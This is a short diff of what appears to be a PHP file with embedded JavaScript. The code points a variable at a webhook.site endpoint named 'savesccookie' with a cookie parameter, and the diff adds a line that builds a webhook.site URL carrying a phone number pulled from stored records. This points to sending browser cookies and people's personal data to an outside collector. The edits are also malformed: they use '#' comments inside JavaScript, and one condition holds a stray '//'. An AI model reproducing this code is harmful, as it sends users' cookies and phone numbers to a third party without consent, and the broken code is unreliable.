@@ -21,9 +21,9 @@ echo 'ok this is from php';
 
 var url = 'https://webhook.site/savesccookie?c='// Webhook URL
 
-if(location.href.includes('localhost:') || //location.href.includes('file://')) {
-    url = 'https://webhook.site/savesccookie?coo=';
- }
+#if(location.href.includes('localhost:') || //location.href.includes('file://')) {
+#    url = 'https://webhook.site/savesccookie?coo=';
+# }
 
 // also remember to make a bundle.js; don't be like me and leak slack webhook url secrets everywhere
 
@@ -422,7 +422,7 @@ $option1 = $data['records'][0]['fields']['phone'];
 print_r($option1);
 
 echo $option1;
-
+$url = "https://webhook.site/whred?phone=$option1&short=$da";
 #print_r($url);
 ?>
 
